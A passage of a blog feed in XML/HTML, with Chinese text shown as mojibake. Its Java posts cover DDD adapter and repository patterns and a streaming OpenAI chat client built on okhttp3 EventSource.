class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºå¤–éƒ¨æ”¯ä»˜æœåŠ¡çš„å®ä¾‹</span></span><br><span class="line">        <span class="type">ExternalPaymentService</span> <span class="variable">externalPaymentService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExternalPaymentService</span>();</span><br><span class="line">        <span class="comment">// åˆ›å»ºé€‚é…å™¨çš„å®ä¾‹ï¼Œæ³¨å…¥å¤–éƒ¨æ”¯ä»˜æœåŠ¡</span></span><br><span class="line">        <span class="type">PaymentAdapter</span> <span class="variable">paymentAdapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PaymentAdapter</span>(externalPaymentService);</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ”¯ä»˜æœåŠ¡çš„å®ä¾‹ï¼Œæ³¨å…¥é€‚é…å™¨</span></span><br><span class="line">        <span class="type">PaymentService</span> <span class="variable">paymentService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PaymentService</span>(paymentAdapter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤„ç†ç”¨æˆ·æ”¯ä»˜</span></span><br><span class="line">        paymentService.processUserPayment(<span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒPaymentAdapter è´Ÿè´£è°ƒç”¨å¤–éƒ¨çš„æ”¯ä»˜æ¥å£ ExternalPaymentService.makePaymentã€‚PaymentService ä½¿ç”¨ PaymentPort æ¥å£ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’ï¼Œè¿™æ ·å°±å®ç°äº†é¢†åŸŸé€»è¾‘ä¸å¤–éƒ¨æœåŠ¡ä¹‹é—´çš„è§£è€¦ã€‚å¦‚æœéœ€è¦æ›´æ¢æ”¯ä»˜æœåŠ¡æä¾›å•†ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°ä¸€ä¸ªæ–°çš„ PaymentAdapterï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ PaymentService çš„ä»£ç ã€‚</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://bugstack.cn/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å°å‚…å“¥ bugstack è™«æ´æ ˆ</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenAI SDKå¼€å‘(2)</title>
      <link href="/2023/12/04/2023-12-4-OpenAI-SDK%E5%BC%80%E5%8F%91-2/"/>
      <url>/2023/12/04/2023-12-4-OpenAI-SDK%E5%BC%80%E5%8F%91-2/</url>
      
        <content type="html"><![CDATA[<h2 id="OpenAI-SDKå¼€å‘-2-okhttp3çš„sseæµå¼åº”ç­”è®¾è®¡"><a href="#OpenAI-SDKå¼€å‘-2-okhttp3çš„sseæµå¼åº”ç­”è®¾è®¡" class="headerlink" title="OpenAI SDKå¼€å‘(2) okhttp3çš„sseæµå¼åº”ç­”è®¾è®¡"></a>OpenAI SDKå¼€å‘(2) okhttp3çš„sseæµå¼åº”ç­”è®¾è®¡</h2><p>æœ¬æ¬¡å¼€å‘å®Œæˆäº†æµå¼åº”ç­”,ä¸»è¦ä½¿ç”¨çš„å°±æ˜¯okhttp3çš„eventsource</p><h4 id="æµç¨‹éªŒè¯"><a href="#æµç¨‹éªŒè¯" class="headerlink" title="æµç¨‹éªŒè¯"></a>æµç¨‹éªŒè¯</h4><p>è·Ÿä¹‹å‰çš„ä¸»è¦åŒºåˆ«å°±æ˜¯éœ€è¦ä½¿ç”¨eventsourceæ¥ç›‘å¬æµå¼åº”ç­”,è¦å°†ChatCompletionRequestä¸­çš„streamå‚æ•°è®¾ç½®ä¸ºtrue,ä»¥okHttpClientå¼€å¯EventSource Factory,ä»¥å…¨æ–°çš„requestæ ¼å¼ä¼ é€’æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test_client_stream</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException, InterruptedException &#123;</span><br><span class="line">        <span class="type">HttpLoggingInterceptor</span> <span class="variable">httpLoggingInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpLoggingInterceptor</span>();</span><br><span class="line">        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.BODY);</span><br><span class="line"></span><br><span class="line">        <span class="type">OkHttpClient</span> <span class="variable">okHttpClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span></span><br><span class="line">                .Builder()</span><br><span class="line">                .addInterceptor(httpLoggingInterceptor)</span><br><span class="line">                .addInterceptor(chain -&gt; &#123;</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">original</span> <span class="operator">=</span> chain.request();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ä»è¯·æ±‚ä¸­è·å– token å‚æ•°ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°è¯·æ±‚è·¯å¾„ä¸­</span></span><br><span class="line">                    <span class="type">HttpUrl</span> <span class="variable">url</span> <span class="operator">=</span> original.url().newBuilder()</span><br><span class="line">                            .addQueryParameter(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line"></span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> original.newBuilder()</span><br><span class="line">                            .url(url)</span><br><span class="line">                            .header(Header.AUTHORIZATION.getValue(), <span class="string">&quot;Bearer &quot;</span> + <span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">                            .header(Header.CONTENT_TYPE.getValue(), ContentType.JSON.getValue())</span><br><span class="line">                            .method(original.method(), original.body())</span><br><span class="line">                            .build();</span><br><span class="line">                    <span class="keyword">return</span> chain.proceed(request);</span><br><span class="line">                &#125;)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> Message.builder().role(Constants.Role.USER).content(<span class="string">&quot;å†™ä¸€ä¸ªjavaå†’æ³¡æ’åº&quot;</span>).build();</span><br><span class="line">        <span class="type">ChatCompletionRequest</span> <span class="variable">chatCompletion</span> <span class="operator">=</span> ChatCompletionRequest</span><br><span class="line">                .builder()</span><br><span class="line">                .messages(Collections.singletonList(message))</span><br><span class="line">                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())</span><br><span class="line">                .stream(<span class="literal">true</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        EventSource.<span class="type">Factory</span> <span class="variable">factory</span> <span class="operator">=</span> EventSources.createFactory(okHttpClient);</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(chatCompletion);<span class="comment">//å°†chatCompletionè½¬ä¸ºjsonæ ¼å¼</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                .url(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">                .post(RequestBody.create(MediaType.parse(ContentType.JSON.getValue()), requestBody))</span><br><span class="line">                <span class="comment">//MediaType.parseç”¨æ¥å£°æ˜æµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç å¯¹requestBodyè¿›è¡Œè§£æ</span></span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">EventSource</span> <span class="variable">eventSource</span> <span class="operator">=</span> factory.newEventSource(request, <span class="keyword">new</span> <span class="title class_">EventSourceListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEvent</span><span class="params">(EventSource eventSource, String id, String type, String data)</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;æµ‹è¯•ç»“æœï¼š&#123;&#125;&quot;</span>, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç­‰å¾…</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>).await();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ–¹æ³•"><a href="#æ·»åŠ æ–¹æ³•" class="headerlink" title="æ·»åŠ æ–¹æ³•"></a>æ·»åŠ æ–¹æ³•</h4><p>åœ¨OpenAiSessionæ¥å£ä¸­æ·»åŠ å¦‚ä¸‹æ–¹æ³•,åœ¨ä¼ å…¥å‚æ•°ä¸ºChatCompletionRequestå’ŒEventSourceListeneræ—¶é‡‡ç”¨æµå¼åº”ç­”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é—®ç­”æ¨¡å‹ GPT-3.5/4.0 &amp; æµå¼åé¦ˆ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chatCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> eventSourceListener   å®ç°ç›‘å¬ï¼›é€šè¿‡ç›‘å¬çš„ onEvent æ–¹æ³•æ¥æ”¶æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                      è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    EventSource <span class="title function_">chatCompletions</span><span class="params">(ChatCompletionRequest chatCompletionRequest, EventSourceListener eventSourceListener)</span> <span class="keyword">throws</span> JsonProcessingException;</span><br></pre></td></tr></table></figure><h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>æ·»åŠ DefaultOpenAiSessionç±»ä¸­çš„chatCompletionsæ–¹æ³•,å®ç°æµå¼åº”ç­”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> EventSource <span class="title function_">chatCompletions</span><span class="params">(ChatCompletionRequest chatCompletionRequest, EventSourceListener eventSourceListener)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">    <span class="comment">// æ ¸å¿ƒå‚æ•°æ ¡éªŒï¼›ä¸å¯¹ç”¨æˆ·çš„ä¼ å‚åšæ›´æ”¹ï¼Œåªè¿”å›é”™è¯¯ä¿¡æ¯ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (!chatCompletionRequest.isStream()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;illegal parameter stream is false!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„å»ºè¯·æ±‚ä¿¡æ¯</span></span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">            <span class="comment">// url: https://api.openai.com/v1/chat/completions - é€šè¿‡ IOpenAiApi é…ç½®çš„ POST æ¥å£ï¼Œç”¨è¿™æ ·çš„æ–¹å¼ä»ç»Ÿä¸€çš„åœ°æ–¹è·å–é…ç½®ä¿¡æ¯</span></span><br><span class="line">            .url(configuration.getApiHost().concat(IOpenAiApi.v1_chat_completions))</span><br><span class="line">            <span class="comment">// å°è£…è¯·æ±‚å‚æ•°ä¿¡æ¯ï¼Œå¦‚æœä½¿ç”¨äº† Fastjson ä¹Ÿå¯ä»¥æ›¿æ¢ ObjectMapper è½¬æ¢å¯¹è±¡</span></span><br><span class="line">            .post(RequestBody.create(MediaType.parse(ContentType.JSON.getValue()), <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(chatCompletionRequest)))</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç»“æœä¿¡æ¯ï¼›EventSource å¯¹è±¡å¯ä»¥å–æ¶ˆåº”ç­”</span></span><br><span class="line">    <span class="keyword">return</span> factory.newEventSource(request, eventSourceListener);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DDDæ¶æ„ä¹‹ä»“å‚¨</title>
      <link href="/2023/12/03/2023-12-3-DDD%E6%9E%B6%E6%9E%84-3/"/>
      <url>/2023/12/03/2023-12-3-DDD%E6%9E%B6%E6%9E%84-3/</url>
      
        <content type="html"><![CDATA[<h3 id="DDDæ¶æ„ä¹‹ä»“å‚¨"><a href="#DDDæ¶æ„ä¹‹ä»“å‚¨" class="headerlink" title="DDDæ¶æ„ä¹‹ä»“å‚¨"></a>DDDæ¶æ„ä¹‹ä»“å‚¨</h3><p>Repositoryï¼ˆä»“å‚¨ï¼‰æ¨¡å¼æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œå®ƒç”¨äºå°†æ•°æ®è®¿é—®é€»è¾‘å°è£…èµ·æ¥ï¼Œä½¿å¾—é¢†åŸŸå±‚å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•ã€ä¸€è‡´çš„æ¥å£æ¥è®¿é—®èšåˆæ ¹æˆ–å®ä½“å¯¹è±¡ã€‚è¿™ä¸ªæ¨¡å¼çš„å…³é”®åœ¨äºæä¾›äº†ä¸€ä¸ªæŠ½è±¡çš„æ¥å£ï¼Œé¢†åŸŸå±‚é€šè¿‡è¿™ä¸ªæ¥å£ä¸æ•°æ®å­˜å‚¨å±‚è¿›è¡Œäº¤äº’ï¼Œè€Œä¸éœ€è¦çŸ¥é“èƒŒåå…·ä½“çš„å®ç°ç»†èŠ‚ã€‚</p><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><ul><li><strong>å°è£…æŒä¹…åŒ–æ“ä½œ</strong>ï¼šRepositoryè´Ÿè´£å°è£…æ‰€æœ‰ä¸æ•°æ®æºäº¤äº’çš„æ“ä½œï¼Œå¦‚åˆ›å»ºã€è¯»å–ã€æ›´æ–°å’Œåˆ é™¤ï¼ˆCRUDï¼‰æ“ä½œã€‚è¿™æ ·ï¼Œé¢†åŸŸå±‚çš„ä»£ç å°±å¯ä»¥é¿å…ç›´æ¥å¤„ç†æ•°æ®åº“æˆ–å…¶ä»–å­˜å‚¨æœºåˆ¶çš„å¤æ‚æ€§ã€‚</li><li><strong>é¢†åŸŸå¯¹è±¡çš„é›†åˆç®¡ç†</strong>ï¼šRepositoryé€šå¸¸è¢«è§†ä¸ºé¢†åŸŸå¯¹è±¡çš„é›†åˆï¼Œæä¾›äº†æŸ¥è¯¢å’Œè¿‡æ»¤è¿™äº›å¯¹è±¡çš„æ–¹æ³•ï¼Œä½¿å¾—é¢†åŸŸå¯¹è±¡çš„è·å–å’Œç®¡ç†æ›´åŠ æ–¹ä¾¿ã€‚<br>æŠ½è±¡æ¥å£ï¼šRepositoryå®šä¹‰äº†ä¸€ä¸ªä¸æŒä¹…åŒ–æœºåˆ¶æ— å…³çš„æ¥å£ï¼Œè¿™ä½¿å¾—é¢†åŸŸå±‚çš„ä»£ç å¯ä»¥åœ¨ä¸åŒçš„æŒä¹…åŒ–æœºåˆ¶ä¹‹é—´åˆ‡æ¢ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹ä¸šåŠ¡é€»è¾‘ã€‚</li></ul><h4 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><ol><li><strong>æ•°æ®è®¿é—®æŠ½è±¡</strong>ï¼šRepositoryä¸ºé¢†åŸŸå±‚æä¾›äº†ä¸€ä¸ªæ¸…æ™°çš„æ•°æ®è®¿é—®æ¥å£ï¼Œä½¿å¾—é¢†åŸŸå¯¹è±¡å¯ä»¥ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘çš„å®ç°ï¼Œè€Œä¸æ˜¯æ•°æ®è®¿é—®çš„ç»†èŠ‚ã€‚</li><li><strong>é¢†åŸŸå¯¹è±¡çš„æŸ¥è¯¢å’Œç®¡ç†</strong>ï¼šRepositoryä½¿å¾—å¯¹é¢†åŸŸå¯¹è±¡çš„æŸ¥è¯¢å’Œç®¡ç†å˜å¾—æ›´åŠ æ–¹ä¾¿å’Œçµæ´»ï¼Œæ”¯æŒå¤æ‚çš„æŸ¥è¯¢é€»è¾‘ã€‚</li><li><strong>é¢†åŸŸé€»è¾‘ä¸æ•°æ®å­˜å‚¨åˆ†ç¦»</strong>ï¼šé€šè¿‡Repositoryæ¨¡å¼ï¼Œé¢†åŸŸé€»è¾‘ä¸æ•°æ®å­˜å‚¨é€»è¾‘åˆ†ç¦»ï¼Œæé«˜äº†é¢†åŸŸæ¨¡å‹çš„çº¯ç²¹æ€§å’Œå¯æµ‹è¯•æ€§ã€‚</li><li><strong>ä¼˜åŒ–æ•°æ®è®¿é—®</strong>ï¼šRepositoryå®ç°å¯ä»¥åŒ…å«æ•°æ®è®¿é—®çš„ä¼˜åŒ–ç­–ç•¥ï¼Œå¦‚ç¼“å­˜ã€æ‰¹å¤„ç†æ“ä½œç­‰ï¼Œä»¥æé«˜åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</li></ol><h4 id="å®ç°æ‰‹æ®µ"><a href="#å®ç°æ‰‹æ®µ" class="headerlink" title="å®ç°æ‰‹æ®µ"></a>å®ç°æ‰‹æ®µ</h4><p>åœ¨å®è·µä¸­ï¼ŒRepositoryæ¨¡å¼é€šå¸¸é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š</p><ol><li><strong>å®šä¹‰Repositoryæ¥å£</strong>ï¼šåœ¨é¢†åŸŸå±‚å®šä¹‰ä¸€ä¸ªæˆ–å¤šä¸ªRepositoryæ¥å£ï¼Œè¿™äº›æ¥å£å£°æ˜äº†æ‰€éœ€çš„æ•°æ®è®¿é—®æ–¹æ³•ã€‚</li><li><strong>å®ç°Repositoryæ¥å£</strong>ï¼šåœ¨åŸºç¡€è®¾æ–½å±‚æˆ–æ•°æ®è®¿é—®å±‚å®ç°è¿™äº›æ¥å£ï¼Œå…·ä½“å®ç°å¯èƒ½æ˜¯ä½¿ç”¨ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œå¦‚MyBatisã€Hibernateç­‰ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨æ•°æ®åº“è®¿é—®APIï¼Œå¦‚JDBCç­‰ã€‚</li><li><strong>ä¾èµ–æ³¨å…¥</strong>ï¼šåœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ¥å°†å…·ä½“çš„Repositoryå®ç°æ³¨å…¥åˆ°éœ€è¦å®ƒä»¬çš„é¢†åŸŸæœåŠ¡æˆ–åº”ç”¨æœåŠ¡ä¸­ã€‚è¿™æ ·åšå¯ä»¥è¿›ä¸€æ­¥è§£è€¦é¢†åŸŸå±‚å’Œæ•°æ®è®¿é—®å±‚ï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå•å…ƒæµ‹è¯•ã€‚</li><li><strong>ä½¿ç”¨è§„èŒƒæ¨¡å¼ï¼ˆSpecification Patternï¼‰</strong>ï¼šæœ‰æ—¶å€™ï¼Œä¸ºäº†æ„å»ºå¤æ‚çš„æŸ¥è¯¢ï¼Œå¯ä»¥ç»“åˆä½¿ç”¨è§„èŒƒæ¨¡å¼ï¼Œè¿™æ˜¯ä¸€ç§å…è®¸å°†ä¸šåŠ¡è§„åˆ™å°è£…ä¸ºå•ç‹¬çš„ä¸šåŠ¡é€»è¾‘å•å…ƒçš„æ¨¡å¼ï¼Œè¿™äº›å•å…ƒå¯ä»¥è¢«Repositoryç”¨æ¥æ„å»ºæŸ¥è¯¢ã€‚</li></ol><p>æ€»ä¹‹ï¼ŒRepositoryæ¨¡å¼æ˜¯DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒæœ‰åŠ©äºä¿æŒé¢†åŸŸæ¨¡å‹çš„èšç„¦å’Œæ¸…æ™°ï¼ŒåŒæ—¶æä¾›äº†çµæ´»ã€å¯æµ‹è¯•å’Œå¯ç»´æŠ¤çš„æ•°æ®è®¿é—®ç­–ç•¥ã€‚</p><h4 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h4><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Javaä»£ç ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•åœ¨DDDæ¶æ„ä¸­å®ç°Repositoryæ¨¡å¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„ç”¨æˆ·ç®¡ç†ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·å®ä½“å’Œç”¨æˆ·ä»“å‚¨æ¥å£ï¼Œä»¥åŠä¸€ä¸ªåŸºäºå†…å­˜çš„ä»“å‚¨å®ç°ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç”¨æˆ·å®ä½“ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ã€getterå’Œsetterçœç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å®šä¹‰ç”¨æˆ·ä»“å‚¨çš„æ¥å£ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> &#123;</span><br><span class="line">    User <span class="title function_">findById</span><span class="params">(Long id)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(User user)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(User user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç„¶åï¼Œæˆ‘ä»¬æä¾›ä¸€ä¸ªåŸºäºå†…å­˜çš„ä»“å‚¨å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InMemoryUserRepository</span> <span class="keyword">implements</span> <span class="title class_">UserRepository</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Long, User&gt; database = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">AtomicLong</span> <span class="variable">idGenerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> database.get(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(database.values());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (user.getId() == <span class="literal">null</span>) &#123;</span><br><span class="line">            user.setId(idGenerator.incrementAndGet());</span><br><span class="line">        &#125;</span><br><span class="line">        database.put(user.getId(), user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        database.remove(user.getId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åº”ç”¨æœåŠ¡ä¸­ä½¿ç”¨è¿™ä¸ªä»“å‚¨ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserRepository userRepository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userRepository.findById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">(String username, String email)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">newUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        newUser.setUsername(username);</span><br><span class="line">        newUser.setEmail(email);</span><br><span 